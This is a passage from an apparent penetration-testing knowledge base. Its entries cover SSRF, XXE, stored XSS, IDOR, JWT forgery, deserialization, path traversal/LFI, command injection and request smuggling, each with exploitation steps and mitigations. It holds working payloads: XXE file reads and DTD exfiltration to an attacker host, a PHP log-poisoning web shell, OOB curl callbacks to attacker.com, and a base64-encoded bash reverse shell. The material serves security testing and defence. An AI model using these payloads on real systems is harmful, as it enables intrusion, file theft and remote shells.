Capture the HTTP response containing the internal data (e.g., the JSON response with AWS `AccessKeyId` and `SecretAccessKey`) and securely document the exposure as proof of critical impact, explicitly without utilizing the tokens.

For Blind SSRF (where the response body is not returned), use an automated tool like ffuf with a wordlist of common internal ports to sweep internal IP ranges (e.g., `10.0.0.0/8`), measuring subtle differences in response times or status codes to map the internal network topology.

examplePayloads.label: Extracting AWS IAM Metadata credentials via basic SSRF
Bypassing naive IP blacklists using decimal representation for 127.0.0.1
Automated Blind SSRF port scanning of localhost using ffuf

variants: In-Band (Basic) SSRF: The response from the internal service or metadata endpoint is directly reflected back to the attacker within the application's HTTP response body.

Blind SSRF: The application issues the backend request but does not return the response body to the attacker. Exploitation requires relying on observable side channels such as varying HTTP status codes, error messages, or response time delays to infer the state of internal services.

Protocol Smuggling / Non-HTTP SSRF: Exploiting backend clients that support alternative URI schemes. Using `file:///etc/passwd` to read local files, or `gopher://` to craft arbitrary TCP payloads and directly communicate with internal daemons like Redis or Memcached to achieve RCE.
mitigation: Implement a rigorous, server-side allowlist of permitted domains, IP addresses, and URI schemes (restricting exclusively to `http://` and `https://`). Reject any input that does not strictly match the allowlist.

Perform secure DNS resolution on the user-supplied URL prior to issuing the request. Ensure the resolved IP address is checked against a deny-list of private, non-routable IP ranges (RFC 1918, loopback, and cloud metadata addresses) immediately before the connection is established to prevent Time-of-Check to Time-of-Use (TOCTOU) DNS rebinding attacks.

Explicitly disable HTTP redirections in the backend HTTP client configuration to prevent an attacker from bypassing initial URL validation by pointing the application to an external server that redirects to an internal IP.

Enforce strict network-level egress filtering (Zero Trust). The application server should only be permitted to initiate outbound connections to explicitly required external services, comprehensively blocking access to internal management interfaces and cloud metadata endpoints at the infrastructure layer.

WEB-083.prerequisites: A web application endpoint designed to ingest and parse user-supplied XML documents (e.g., SOAP web services, SAML single sign-on processing, legacy REST APIs accepting `application/xml`, or document upload features that parse XML-based formats like DOCX/XLSX). For Blind/Out-of-Band XXE exploitation, the attacker requires a controlled, internet-facing web server to host malicious Document Type Definition (DTD) files and capture exfiltrated data.
WEB-083.whatItIs: The app processes XML data from users, and the parser handling it is set up to fetch and read external content referenced inside that XML — including local files on the server itself. An attacker can define a reference pointing at a sensitive file, and get the parser to read it and embed its contents right into the processed result.
WEB-083.rootCause: Many XML-parsing libraries have historically shipped with this risky feature turned on by default, for the sake of following the XML standard exactly. Unless developers specifically turn it off, any XML the app processes — including XML from an untrusted source — can reference and pull in content the developer never intended to expose.
WEB-083.impact: Exploiting XXE allows an attacker to achieve Local File Inclusion (LFI), enabling the extraction of highly sensitive system files (e.g., `/etc/passwd`, `/etc/shadow`, Windows `win.ini`), application source code, and configuration files containing hardcoded credentials. Furthermore, XXE can be weaponized to perform Server-Side Request Forgery (SSRF) to scan internal network segments, or trigger an asymmetric Denial of Service (DoS) attack, commonly known as the 'Billion Laughs' attack, by recursively expanding entities until server memory is exhausted.
stepsToIdentify: Identify all application endpoints that accept XML data. Monitor intercepted HTTP requests in Burp Suite for `Content-Type: application/xml` or `text/xml` headers.

If an endpoint ostensibly expects JSON data, systematically attempt to alter the `Content-Type` header to `application/xml` and submit a functionally equivalent XML payload to test if the backend framework inadvertently supports and parses XML content.

Inject a basic, self-contained internal entity (e.g., `<!DOCTYPE test [ <!ENTITY xxe "test_string"> ]>`) and reference the entity (`&xxe;`) within a data field known to be reflected in the application's response. If "test_string" appears in the response, the parser supports entity expansion.
Attempt to escalate to an external entity by defining a payload designed to read a universally accessible, benign operating system file (e.g., `<!ENTITY xxe SYSTEM "file:///etc/hostname">`).
exploitationSteps: If the initial test successfully returns the contents of the target file in the HTTP response (In-band XXE), proceed to extract a definitively sensitive file (like `/etc/passwd`) and document the response as conclusive evidence.
If the application parses the XML but fails to reflect the entity's value in the response (Blind XXE), deploy a custom HTTP server on your controlled infrastructure to host a malicious DTD file.
Craft an XML payload containing a parameterized entity that instructs the target server to connect to your HTTP server and retrieve the malicious DTD.

Configure the hosted malicious DTD to define a new entity that reads a local file on the target server, and then forces the target server to exfiltrate that file's contents by appending it as a URL parameter in a subsequent HTTP GET request back to your controlled server.
Monitor your HTTP server's access logs to capture and decode the exfiltrated file data.

examplePayloads.label: In-band XXE payload to read local file (/etc/passwd)
examplePayloads.command: curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><user>&xxe;</user></data>' https://<target-url>/api/process_xml

examplePayloads.label: Hosting a malicious DTD for Out-of-Band (Blind) XXE data exfiltration (Python snippet)
examplePayloads.command: echo '<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM \"http://<attacker-ip>/?data=%file;\">"><%eval;%exfiltrate;' > mal.dtd && sudo python3 -m http.server 80

examplePayloads.label: Blind XXE payload invoking the external parameterized DTD
examplePayloads.command: curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<attacker-ip>/mal.dtd"> %xxe;]><data>test</data>' https://<target-url>/api/process_xml

variants: In-band XXE: The most straightforward variant where the extracted file data or SSRF response is directly embedded and returned within the application's standard HTTP response.

Blind / Out-of-Band (OOB) XXE: The application parses the XML but does not reflect any values. The attacker must use complex parameterized entities to force the server to transmit the stolen data to an external, attacker-controlled domain.

Error-based XXE: The application does not reflect parsed values but does display verbose XML parsing errors. The attacker crafts a payload that intentionally causes a parsing error, embedding the contents of the target local file within the error message text itself.
mitigation: The most effective and comprehensive mitigation is to completely disable the processing of external entities and DTDs within the XML parser's configuration. For instance, in Java applications, explicitly set the features `http://apache.org/xml/features/disallow-doctype-decl`, `http://xml.org/sax/features/external-general-entities`, and `http://xml.org/sax/features/external-parameter-entities` to `true`.

If DTD processing is an absolute architectural necessity, developers must explicitly disable external entity resolution (e.g., invoking `setExpandEntityReferences(false)`) and utilize rigorous entity validation.
Where feasible, migrate away from complex, feature-heavy data formats like XML in favor of simpler, less exploitable formats such as JSON.

Ensure all underlying XML processing libraries (e.g., `libxml2`, `Xerces`) and application frameworks are continuously patched and updated to modern versions, which often disable dangerous entity features by default.

WEB-084.prerequisites: Access to application functionalities where user-supplied input is permanently saved to a backend database or file system, and is subsequently retrieved and rendered in the browser of other users (e.g., profile biography fields, forum posts, comment sections, or administrative dashboards displaying user activity). An intercepting proxy (Burp Suite), a modern web browser equipped with Developer Tools, and optionally, the Browser Exploitation Framework (BeEF) to demonstrate advanced post-exploitation impact.
WEB-084.whatItIs: This is the more dangerous, persistent version of script injection: instead of needing to trick a victim into clicking a special link, the malicious script gets permanently saved on the server (say, as a comment or profile field) and automatically runs for every single visitor who later views that saved content.
WEB-084.rootCause: The app trusts data it pulls back out of its own database, wrongly assuming it was already cleaned up when it was first saved. Without properly encoding that data at the exact moment it's inserted into a page — regardless of where it originally came from — the browser ends up interpreting it as real, runnable code instead of harmless text.
WEB-084.impact: Execution of arbitrary JavaScript in the victim's browser context yields catastrophic consequences. An attacker can silently hijack authenticated sessions by exfiltrating sensitive `document.cookie` values or LocalStorage tokens. Furthermore, XSS bypasses Cross-Site Request Forgery (CSRF) protections, enabling the attacker to force the victim's browser to execute state-changing actions (e.g., transferring funds, changing account passwords, or granting administrative privileges) seamlessly on their behalf. The attacker can also inject highly convincing phishing forms or seamlessly redirect users to malicious domains.
stepsToIdentify: Systematically map all input fields and API endpoints where data is submitted and persistently displayed elsewhere within the application's interface.

Inject a unique, benign, and easily searchable alphanumeric string (e.g., `XSS_PROBE_998877`) into these fields to accurately trace where and how the data is reflected across various application pages.

Once a reflection point is located, inject a payload containing HTML syntax characters (`< > " ' & /`) and carefully inspect the rendered DOM via the browser's Developer Tools. Observe if the characters are safely HTML-encoded (e.g., `<` rendered as `<`) or if they are rendered as raw, executable markup.

Crucially, determine the exact execution context of the reflection (e.g., is the data rendered directly inside standard HTML tags, embedded within a script variable, encapsulated in an HTML attribute like `href`, or within CSS?). The context dictates the precise syntax required to construct a functional breakout payload.
exploitationSteps: Craft a targeted payload specifically designed to break out of the identified output context. For example, if reflected inside an `<input value="">` attribute, the payload must first close the attribute and tag (`">`) before introducing the script execution logic.

Submit the crafted payload into the application and navigate to the page where the content is rendered. Confirm successful execution via a harmless, non-disruptive indicator, such as `console.log()` or a basic `alert(document.domain)`.

To decisively demonstrate real-world impact without causing harm, craft a payload that performs a stealthy XMLHttpRequest (AJAX) to a state-changing application endpoint (e.g., modifying the user's profile settings) utilizing the victim's active session.

Thoroughly document the successful payload, the specific vulnerable input vector, and the execution context. Strictly avoid utilizing payloads that continuously loop, generate infinite alerts, or permanently degrade the application's usability for other users or assessors.

examplePayloads.label: Standard payload for direct HTML body context reflection
Payload engineered to break out of an HTML attribute context
Advanced payload for bypassing rudimentary script filters utilizing SVG and Base64 exfiltration

variants: Stored XSS (Persistent): The malicious payload is persistently saved on the backend server and automatically served to any user viewing the affected content, representing the highest risk due to its broad reach.

Reflected XSS (Non-Persistent): The payload is delivered via a crafted link containing the script in a URL parameter, which the server immediately reflects back unescaped in the response. It requires active social engineering to trick a victim into clicking the link.

DOM-based XSS: The vulnerability exists entirely within the client-side JavaScript architecture. The server is completely uninvolved; instead, a malicious payload is read from a client-side source (like `window.location.hash`) and unsafely passed directly to an execution sink (like `element.innerHTML` or `eval()`).
mitigation: Implement rigorous, context-aware output encoding across the entire application immediately before data is rendered to the browser. Utilize proven, robust libraries (e.g., DOMPurify) or rely on modern frontend framework native rendering engines (such as React or Angular) which inherently treat interpolated data as text rather than executable markup.

Deploy a robust Content Security Policy (CSP) via HTTP response headers. A strict CSP drastically reduces XSS impact by explicitly restricting the authorized domains from which scripts can be loaded and categorically blocking the execution of inline scripts (`unsafe-inline`).

Configure all sensitive session cookies with the `HttpOnly` flag. While this does not prevent XSS execution, it provides a crucial layer of defense by preventing client-side JavaScript from programmatically accessing or exfiltrating the session identifier.

Enforce strict secure coding practices in client-side JavaScript, strictly avoiding hazardous sinks like `innerHTML` or `document.write()`, and instead utilizing safe alternatives like `textContent` or `innerText` when manipulating the Document Object Model.

WEB-085.prerequisites: Access to at least two distinct user accounts (Attacker and Victim) provisioned at the exact same authorization/privilege level within the application. This is necessary to conclusively verify horizontal privilege escalation and confirm data belongs to a separate entity. Burp Suite Professional is essential, specifically utilizing extensions like 'Autorize' or 'Authz' to automate the process of replaying requests across different authenticated sessions.
WEB-085.whatItIs: This is the classic access-control problem, described again here in more detail: the app exposes a direct reference to an internal record — a database ID, an account number — in a URL or request, and completely fails to check whether the person asking is actually allowed to see or change that specific record.
WEB-085.rootCause: The backend uses whatever ID the client supplies to look something up, with no accompanying step tying that lookup back to who's actually logged in and making the request — the crucial ownership check is simply missing.
WEB-085.impact: An attacker can systematically exploit IDOR to achieve horizontal privilege escalation, granting them the ability to view, modify, or maliciously delete sensitive data, financial records, or PII belonging to any other user on the platform. In severe cases where the exposed object identifier relates to administrative entities, system configurations, or highly privileged roles, the vulnerability rapidly escalates to vertical privilege escalation and total system compromise.
stepsToIdentify: Thoroughly map the application's functionality while authenticated as User A (Attacker), meticulously identifying all URL parameters, HTTP headers, and API JSON payloads that directly reference objects via sequential IDs, UUIDs, or usernames (e.g., `/api/v1/invoices/1005` or `{"user_id": 443}`).
Perform a legitimate action using User B (Victim) to generate a known, exclusive object and precisely note its assigned identifier.
While maintaining the authenticated session of User A, intercept the outbound HTTP requests and modify the identifier parameter to point directly to User B's object ID.

Carefully analyze the HTTP response. If the application returns User B's sensitive data with a `200 OK` status instead of actively enforcing an authorization boundary via a `401 Unauthorized` or `403 Forbidden` error, the endpoint is definitively vulnerable.

Systematically attempt HTTP method manipulation (e.g., converting a benign `GET` request into a state-changing `PUT`, `POST`, or `DELETE`) on the unauthorized object to test for high-impact, state-changing IDORs.
exploitationSteps: Leveraging Burp Suite's Intruder tool or the Autorize extension, automate the exploitation by replaying the identified vulnerable request while aggressively iterating through a logical range of sequential IDs (e.g., fuzzing from 1000 to 2000) to enumerate the database.
Document the successful, unauthorized extraction of data belonging to multiple other users to demonstrate systemic impact.

If the application utilizes non-sequential UUIDs, rigorously evaluate the application's broader ecosystem to determine if these UUIDs are inadvertently leaked elsewhere (e.g., exposed in a public user directory, a secondary API endpoint, or referenced in Javascript files), effectively negating the complexity of guessing the identifier.

Attempt to bypass rudimentary, poorly implemented authorization filters using advanced techniques like HTTP Parameter Pollution (e.g., supplying `?user_id=attacker_id&user_id=victim_id`) or JSON array wrapping (e.g., `{"user_id": ["attacker_id", "victim_id"]}`).

examplePayloads.label: Manual IDOR verification via curl (Substituting User A's ID with User B's ID)
Automated IDOR enumeration and data harvesting utilizing ffuf
Exploiting state-changing IDOR via HTTP Parameter Pollution to bypass weak filters

variants: Horizontal IDOR: The attacker accesses or modifies data belonging to another user who operates at the exact same privilege level.
Vertical IDOR: The attacker manipulates a reference to access administrative functionality, higher-privileged data, or completely bypass role-based access controls.

Blind IDOR: The attacker modifies an object identifier where the application successfully processes the request but does not reflect the altered data in the immediate HTTP response, necessitating the attacker to observe backend state changes (e.g., verifying a password change on a victim account) to confirm exploitation.
mitigation: Implement robust, centralized Object-Level Authorization checks globally across the application. Prior to fulfilling any data request or modification, the backend code must explicitly evaluate if the currently authenticated session possesses the specific rights to interact with the requested object ID.

Architecturally, avoid relying on client-provided IDs for operations pertaining to the current user. The backend must implicitly derive the user's identity securely from the trusted session token (e.g., extracting the user ID directly from a validated JWT payload) whenever rendering or modifying user-specific profiles.

Deprecate easily guessable sequential integers in favor of cryptographically secure, unpredictable Random Globally Unique Identifiers (UUIDv4) for all exposed database records. While this serves as an effective defense-in-depth measure to prevent rapid enumeration, it is explicitly not a replacement for true authorization validation.

WEB-087.prerequisites: A target web application or API that utilizes JSON Web Tokens (JWT) for authentication, session management, or access control assertion. The assessor requires access to at least one valid, signed JWT generated by the application. Specialized tools such as `jwt_tool`, CyberChef, or the Burp Suite JWT Editor extension are required to decode, manipulate, and forge the cryptographic tokens.
WEB-087.whatItIs: An attacker modifies the contents of their JWT login token — for example, changing their role from regular user to admin — and finds a way to get the server to accept the tampered token as genuine anyway. This can happen a few different ways: tricking the server into using the wrong verification method, telling the token 'no signature needed' and having the server go along with it, or simply cracking a weak shared secret through brute force.
WEB-087.rootCause: This almost always comes down to the server trusting what the token itself claims about how it should be verified, instead of insisting on one specific, hardcoded method no matter what the token says. That, combined with weak or easily-guessed signing secrets or outdated libraries that still allow insecure options, lets an attacker forge a token the server will accept as genuinely valid.
WEB-087.impact: Successful exploitation results in total authentication bypass and vertical privilege escalation. By forging a token asserting administrative claims, an attacker can completely impersonate any user on the system, bypass all authentication gateways, and achieve total, unfettered compromise of the application and its underlying data.
stepsToIdentify: Capture a valid JWT from an authenticated session, typically located within the `Authorization: Bearer` HTTP header, a session cookie, or an API response payload.
Decode the Base64Url-encoded header and payload segments to analyze the token's structure and understand the authorization claims (e.g., `role`, `user_id`, `email`, and the specified `alg`).

Actively test for the critical 'None' algorithm vulnerability by modifying the header to `{"alg":"none"}`, arbitrarily altering the payload claims (e.g., setting `"role": "admin"`), and completely stripping the cryptographic signature portion, leaving only the two trailing dots.

If the token indicates an asymmetric algorithm is in use (e.g., `RS256`), attempt to extract the application's public key (often exposed legitimately at a standardized `/jwks.json` endpoint or derivable offline from multiple valid tokens).

Test for Algorithm Confusion by altering the token's header to `HS256` and actively signing the modified token using the application's asymmetric public key (in PEM format) as the symmetric HMAC secret.
exploitationSteps: Utilize a dedicated framework like `jwt_tool` to automate the rapid testing of known JWT attack vectors (including `alg=None`, weak secret dictionary brute-forcing, and algorithm confusion).

If the token utilizes symmetric encryption (e.g., `HS256`) and a weak, human-generated secret is suspected, execute a high-speed offline dictionary attack using Hashcat or John the Ripper against the captured token's signature.
Upon identifying a bypass methodology or recovering the signing key, generate a forged JWT, explicitly modifying the payload claims to assert administrative access or impersonate a high-value target.
Inject the forged JWT into HTTP requests directed at highly sensitive, administrative endpoints to conclusively confirm vertical privilege escalation.
Thoroughly document the specific validation logic flaw and the exact methodology used to bypass the signature.

examplePayloads.label: Automated JWT vulnerability scanning and exploitation utilizing jwt_tool
High-speed offline dictionary attack against an HS256 JWT signature using hashcat
Manual construction of an alg=none bypass token using Base64Url encoding

variants: Algorithm 'None' Bypass: The server accepts tokens where the signature validation process is explicitly disabled by the token's header.
Algorithm Confusion (RS256 to HS256): The server is tricked into using its public key (intended for asymmetric verification) as a symmetric secret to validate an HMAC signature.
JWK/JKU Header Injection: The attacker manipulates the `jku` header to force the server to fetch a malicious public key from an attacker-controlled infrastructure to validate the forged signature.

KID (Key ID) Path Traversal: The attacker manipulates the `kid` header, utilizing directory traversal sequences to point the server to a predictable local file (e.g., `/dev/null`) to act as the symmetric signing key.
mitigation: Architecturally hardcode and strictly enforce the expected cryptographic algorithm (e.g., explicitly require `RS256`) within the backend validation logic. Under no circumstances should the server trust or rely upon the `alg` header provided by the untrusted client token.
Utilize immensely strong, cryptographically secure, and randomly generated secrets (minimum 256 bits) for symmetric signing (HS256) and ensure they are rotated regularly.
Rigorously validate all JWT headers (especially `kid` and `jku`), strictly disallowing arbitrary URL parameters, external domains, or path traversal characters.

Maintain aggressive patch management for all JWT processing libraries, ensuring they are updated to modern versions that systematically block legacy algorithm confusion and 'none' vulnerabilities by default.

WEB-089.prerequisites: An application endpoint that natively consumes and reconstructs serialized objects (e.g., Java serialized objects via `ObjectInputStream`, PHP serialization via `unserialize()`, Python Pickle data, or .NET ViewState) from the untrusted client. Specialized exploit generation tools such as `ysoserial` for Java, `PHPGGC` for PHP, or custom Python scripts are necessary to construct the malicious serialized payloads.
WEB-089.whatItIs: The app accepts a specially-formatted, serialized chunk of data from somewhere untrusted and rebuilds it back into a live object in memory without verifying it first. An attacker can craft this data to exploit existing pieces of code already present in the app, chaining them together into something the developer never intended — including running their own code.
WEB-089.rootCause: The app uses the programming language's built-in mechanism for rebuilding these objects, which can construct any type of object available anywhere in the app, with no restriction on which types are allowed. Certain built-in methods run automatically the moment an object like this gets rebuilt — and if the right existing classes are available, an attacker can chain them together into unintended, dangerous behavior.
WEB-089.impact: Exploiting insecure deserialization typically results in critical Remote Code Execution (RCE), granting the attacker total control over the application server. Depending on the specific gadget chains available in the application's dependencies, it can also lead to complete authentication bypass, severe denial of service (DoS), or arbitrary file manipulation and extraction.
stepsToIdentify: Meticulously examine all HTTP requests (including cookies, hidden form fields, and API payloads) for known signatures of serialized data formats (e.g., identifying `rO0AB` for Base64-encoded Java objects, `O:4:"User"` for PHP serialized strings, or specific ViewState formatting indicators in .NET).

Attempt to modify a benign, easily observable property within the serialized object to determine if the application's state visibly changes, definitively confirming that the backend is blindly trusting the deserialized data structure.

Generate a benign serialized object containing a known time-delay gadget or an Out-of-Band (OOB) DNS lookup callback to safely verify that the deserialization process actively triggers code execution upon object reconstruction.

Analyze error messages, stack traces, or utilize fingerprinting tools to determine the precise backend technology stack and identify installed third-party libraries (e.g., Apache Commons Collections, Spring, or Jackson) that are notorious for containing exploitable gadget chains.
exploitationSteps: Select the appropriate gadget chain generator framework (e.g., `ysoserial` for Java, `PHPGGC` for PHP) based entirely on the targeted language and the suspected vulnerable libraries present in the classpath.

Generate a highly specific payload designed to execute a harmless, verifiable OS command (e.g., `ping <collaborator_domain>`, `nslookup`, or `sleep`) to conclusively confirm RCE capability without disrupting the service.
Encode and transmit the malicious serialized payload to the identified vulnerable endpoint, ensuring the `Content-Type` and encoding perfectly match the application's expectations.
Vigilantly monitor the Out-of-Band listener (e.g., Burp Collaborator) for the incoming DNS or HTTP interaction, definitively confirming successful remote code execution.

Thoroughly document the successful callback and the identified gadget chain. Do not attempt to deploy a reverse shell or exfiltrate data unless explicitly scoped and authorized by the engagement rules.

examplePayloads.label: Generating a Java deserialization payload via ysoserial leveraging the CommonsCollections1 gadget chain
Transmitting the generated Java payload to the target endpoint via curl
Generating a PHP deserialization payload utilizing PHPGGC for the Monolog/RCE1 chain

variants: Java Deserialization: Abusing `ObjectInputStream` and exploitable libraries in the Java classpath.
PHP Object Injection: Exploiting the `unserialize()` function and leveraging classes with dangerous `__destruct` or `__wakeup` magic methods.
Python Pickle Execution: Python's `pickle` module allows arbitrary code execution by design; unpickling untrusted data leads to immediate RCE via the `__reduce__` method.
.NET Insecure ViewState: Manipulating the MAC-unprotected ViewState or abusing the deeply flawed `BinaryFormatter` to achieve RCE.
mitigation: Architecturally, do not accept serialized objects from untrusted sources under any circumstances. Migrate to universally safe, data-only formats such as JSON or XML, and utilize secure parsing libraries that strictly enforce data-typing without object instantiation.

If native serialization is an unavoidable legacy requirement, implement strong cryptographic signatures (e.g., HMAC) generated by the server. The server must cryptographically verify the signature *before* initiating the deserialization process to ensure the object has not been tampered with.

Implement rigorous, strict class allowlisting during the deserialization phase (for instance, by deeply overriding the `resolveClass` method in Java) to permit only specific, heavily audited, and explicitly safe classes to be instantiated.
Maintain an aggressive patch management cadence, ensuring all third-party libraries and frameworks are updated to versions that proactively remove or patch known gadget chains.

WEB-090.prerequisites: Access to a web application endpoint that dynamically reads, includes, processes, or downloads files based directly on user-supplied input parameters (e.g., URLs containing `page=`, `file=`, `image=`, or `template=`). Tools like ffuf or Burp Suite Intruder, populated with specialized traversal and LFI fuzzing wordlists, are highly recommended for comprehensive discovery.
WEB-090.whatItIs: This combines two related problems: an attacker uses '../' sequences to step outside the folder a file-reading feature was supposed to stay inside — and in the more severe variant, the server doesn't just read that file, it actually runs it as code, turning what would just be an information leak into full control of the server.
WEB-090.rootCause: The app builds file paths by directly pasting user input onto a base folder, without first cleaning up the path or checking that the final result actually stays inside the folder it's supposed to be limited to. It implicitly trusts that a user will only ever request files they're actually meant to access.
WEB-090.impact: A standard Directory Traversal attack allows the attacker to read highly sensitive system files (e.g., `/etc/passwd`, `/etc/shadow`, Windows `win.ini`), steal application source code, and extract configuration files containing plaintext database credentials. In LFI scenarios, if an attacker can successfully upload a file (even an image with a malicious payload in its EXIF data) or poison a local system log file (Log Poisoning) with executable code, they can execute that file via the LFI vector, achieving full Remote Code Execution (RCE).
stepsToIdentify: Systematically locate parameters, API endpoints, or headers that appear to reference files or dynamically load content components (e.g., `?file=report.pdf`, `?language=en`, `?page=about`).

Substitute the legitimate filename with standard directory traversal sequences explicitly pointing to a universally known operating system file (e.g., `../../../../etc/passwd` for Linux or `..\..\..\windows\win.ini` for Windows).

If rudimentary filters or WAFs are in place, attempt advanced bypass techniques: URL encoding (`%2e%2e%2f`), double URL encoding (`%252e%252e%252f`), non-standard stripping bypasses (`....//`), or null byte injection (`%00` on older PHP distributions).
Meticulously analyze the HTTP response body to confirm if the contents of the targeted file are successfully disclosed.
exploitationSteps: Conclusively confirm the vulnerability by extracting a standard, non-destructive proof file (such as `/etc/passwd` or `C:\Windows\win.ini`).

Attempt to aggressively escalate the LFI vulnerability to RCE via Log Poisoning: inject a malicious payload (e.g., `<?php system($_GET['cmd']); ?>`) into an HTTP header (like the `User-Agent`) and intentionally trigger an error to force the server to log the payload.

Utilize the discovered LFI vulnerability to purposefully include the web server's access log (e.g., `../../../../var/log/apache2/access.log`). The server will parse the log file, execute the injected PHP payload, and return the command output.

Alternatively, utilize language-specific wrappers (such as PHP's `php://filter/convert.base64-encode/resource=index.php`) to safely read the application's source code in Base64 format, preventing the server from executing it and instead revealing backend logic and credentials.
Thoroughly document the file disclosure or code execution methodology, ensuring absolutely no sensitive PII or credentials are retained post-assessment.

examplePayloads.label: Basic Directory Traversal payload executed via curl to read /etc/passwd
Utilizing a PHP Filter wrapper to safely extract backend source code as Base64
Automated LFI and Traversal fuzzing utilizing ffuf and a specialized wordlist

variants: Directory Traversal: The vulnerability is strictly limited to reading files outside the web root (Information Disclosure), with no execution capabilities.
Local File Inclusion (LFI): The server includes the requested file and parses/executes its contents, opening the door to RCE via log poisoning or file upload abuse.

Remote File Inclusion (RFI): The most severe variant, where the application is instructed to download and directly execute a malicious script hosted on an attacker-controlled external URL (e.g., `?page=http://attacker.com/shell.txt`).
mitigation: Architecturally, avoid passing user-supplied input directly to backend filesystem APIs under any circumstances. Utilize indirect object references (e.g., mapping an integer ID `1` to `report.pdf` in a database) instead of relying on filenames.
If dynamic path construction is a strict operational necessity, rigidly validate the user input against a hardcoded allowlist of explicitly permitted, alphanumeric filenames.

Programmatically normalize the requested path (e.g., utilizing `realpath()` in PHP or `os.path.abspath()` in Python) and definitively verify that the resulting absolute path strictly begins with the designated, secure base directory before proceeding with the file operation.

Run the web application service adhering strictly to the Principle of Least Privilege, utilizing chroot jails, AppArmor/SELinux profiles, or containerization to severely restrict the application's access to the broader host filesystem.

WEB-091.prerequisites: Access to a web application endpoint that passes user-supplied data directly to system-level shells or OS command execution functions (e.g., `system()`, `exec()`, `popen()` in PHP, `Runtime.getRuntime().exec()` in Java, or `child_process.exec()` in Node.js). An intercepting proxy like Burp Suite for payload injection, and an Out-of-Band (OOB) listener (e.g., Burp Collaborator or a controlled VPS) for verifying blind command execution.
WEB-091.whatItIs: The app builds an operating-system command using data supplied by the user, without validating or cleaning it up first. That lets an attacker tack on extra commands using special characters the shell understands, getting the server to run whatever they want with the same permissions the web app itself has.
WEB-091.rootCause: Instead of using a safer method that clearly separates the actual command from its arguments, the code pastes user input directly into a command string and runs it through a function that interprets it like something typed into a terminal — trusting that users will only ever supply the kind of simple, expected value (like an IP address) the feature was built for.
WEB-091.impact: Exploitation leads directly to Remote Code Execution (RCE) and total server compromise. An attacker can deploy web shells, pivot into the internal network, access backend databases, exfiltrate sensitive files (like `/etc/shadow` or `.env` files containing API keys), and permanently alter the system state, completely bypassing application-level access controls.
stepsToIdentify: Identify application features that plausibly interact with the underlying OS, such as network diagnostic tools (ping, traceroute), image processing libraries (ImageMagick wrapping), or system administration dashboards.
Inject standard shell metacharacters (`|`, `;`, `||`, `&&`) combined with benign commands (e.g., `id`, `whoami`, `uname -a`) into suspected parameters.
Analyze the HTTP response for the output of the injected command (In-band Command Injection).
If the application does not return command output, inject time-delay commands (e.g., `ping -c 10 127.0.0.1` or `sleep 10`) to identify Blind Command Injection via observable response latency.
Utilize OOB techniques by injecting commands that force the server to resolve a DNS name or initiate an HTTP request to an attacker-controlled listener (e.g., `curl http://attacker.com/$(whoami)`).
exploitationSteps: Once execution is confirmed, determine the privileges of the executing user (e.g., `www-data` or `root`) to assess immediate escalation paths.
Identify the underlying OS (Linux vs. Windows) to tailor subsequent payloads (e.g., utilizing `nc`, `bash -i`, or PowerShell).

Construct a robust payload to establish a reverse shell connection back to your controlled infrastructure, bypassing rudimentary character filters if necessary (e.g., using Base64 encoding: `echo YmFzaCAtaSA... | base64 -d | bash`).
Document the successful execution and the extent of the access achieved. Terminate the reverse shell immediately after capturing evidence to minimize operational risk.

examplePayloads.label: In-band injection using the semicolon operator to append the 'id' command
Blind command injection utilizing an Out-of-Band (OOB) DNS exfiltration technique
Filter bypass using Base64 encoding to execute a reverse shell safely
examplePayloads.command: curl -X POST -d "input=; echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK' | base64 -d | bash" https://<target-url>/process

variants: In-band Command Injection: The output of the injected command is returned directly in the HTTP response.
Blind (Time-Based) Command Injection: The application suppresses output, requiring the attacker to infer execution via induced time delays (e.g., `sleep 10`).
Blind (Out-of-Band) Command Injection: The attacker forces the server to initiate a network connection (DNS, HTTP) back to an external listener, potentially exfiltrating data in the subdomain string.
mitigation: Fundamentally, avoid invoking system shells or executing OS commands directly from within application code. Utilize built-in language APIs or dedicated libraries that accomplish the same task (e.g., using native filesystem APIs instead of calling `cat` or `rm`).

If calling an external executable is unavoidable, explicitly avoid passing user input to a shell interpreter (like `/bin/sh -c` or `cmd.exe /c`). Instead, use parameterized execution functions (such as `ProcessBuilder` in Java or `child_process.execFile` in Node.js) where arguments are passed as a strictly defined array, nullifying the effect of shell metacharacters.
Implement rigorous input validation utilizing a strict allowlist. For example, if an IP address is expected, validate that the input strictly conforms to an IPv4/IPv6 regex format before processing.

Enforce the Principle of Least Privilege by ensuring the web application service account operates with the absolute minimum OS permissions required, heavily restricting access to sensitive binaries like `nc`, `curl`, or `wget`.

WEB-092.prerequisites: A web application infrastructure utilizing a reverse proxy, load balancer, or Content Delivery Network (CDN) that routes HTTP traffic to one or more backend web servers over a persistent, reused TCP connection. Burp Suite Professional, specifically the 'HTTP Request Smuggler' extension, is required for precise, timed payload delivery and analysis.
WEB-092.whatItIs: This is a complex, subtle attack that exploits a disagreement between a front-facing proxy and the actual backend server about where one HTTP request ends and the next one begins. By crafting a request with conflicting length information, an attacker can smuggle a hidden, second request hidden inside the first one — which the backend then mistakes for the start of the next legitimate user's request, letting the attacker manipulate or steal parts of that other person's traffic.
WEB-092.rootCause: This comes down to the front-end and back-end servers disagreeing about how to interpret conflicting information about a request's length and structure. If either server can be tricked into handling that conflicting information differently than the other, the two servers end up disagreeing about exactly where one request stops and the next begins — and that gap is exactly what an attacker exploits to sneak in a hidden, extra request.
WEB-092.impact: Request smuggling compromises the entire infrastructure's request-routing integrity. An attacker can bypass front-end security controls (WAFs), gain unauthorized access to internal administrative endpoints, capture and steal subsequent users' requests (including session cookies and credentials), or perform devastating Web Cache Poisoning, serving malicious content to all users requesting a specific resource.
stepsToIdentify: Send an HTTP request containing both `Content-Length` and `Transfer-Encoding: chunked` headers to the target endpoint.
Conduct timing-based desynchronization tests: send a CL.TE payload designed to cause a timeout on the back-end, and a TE.CL payload designed to cause a timeout on the front-end.

Observe the HTTP response times. A significant, deliberate delay (e.g., 10 seconds) indicates that one server is waiting for data chunks while the other considers the request complete, proving desynchronization is possible.
Utilize the Burp Suite HTTP Request Smuggler extension to automate the complex discovery phase safely, ensuring minimal disruption to live traffic.
